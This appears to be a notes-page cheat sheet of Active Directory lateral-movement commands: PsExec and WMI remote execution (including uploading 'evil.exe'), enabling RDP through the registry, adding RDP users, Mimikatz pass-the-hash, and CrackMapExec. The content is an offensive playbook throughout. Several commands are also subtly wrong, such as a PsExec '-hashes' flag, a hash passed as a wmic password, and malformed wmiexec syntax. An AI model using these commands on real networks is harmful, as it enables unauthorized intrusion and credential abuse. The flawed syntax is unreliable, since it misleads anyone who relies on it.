---
layout: notes
permalink: /notes/ad/lateral/
title: Active Directory Lateral Movement
---

# Active Directory Lateral Movement

## PsExec
```powershell
# Execute command remotely
PsExec.exe \\\\<target> -u <user> -p <pass> cmd

# Run with hash
PsExec.exe \\\\<target> -hashes <lm:ntlm> cmd

# Upload and execute
PsExec.exe \\\\<target> -c evil.exe -u <user> -p <pass>
```

## WMI
```powershell
# Execute remote command
wmic /node:<target> process call create "cmd.exe /c whoami"

# Query remote process
wmic /node:<target> process get caption,executablepath

# Start process with credentials
wmic /node:<target> /user:<user> /password:<pass> process call create "cmd.exe"
```

## RDP
```powershell
# Connect via RDP
mstsc /v:<target>

# Enable RDP remotely
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Add user to RDP group
net localgroup "Remote Desktop Users" <user> /add
```

## Pass-the-Hash
```powershell
# Pass hash with Mimikatz
mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"

# Pass hash with PsExec
PsExec.exe \\\\<target> -hashes <lm:ntlm> cmd

# Pass hash with WMI
wmic /node:<target> /user:<user> /password:<hash> process call create "cmd.exe"
```

## Tools
- PsExec: ```PsExec.exe \\\\<target> -u <user> -p <pass>```
- WMIExec: ```wmiexec.py <target> -u <user> -p <pass>```
- RDPWrap: ```rdpwrap.dll```
- Mimikatz: ```mimikatz.exe "sekurlsa::pth"```
- CrackMapExec: ```crackmapexec smb <target> -u <user> -p <pass> -x whoami```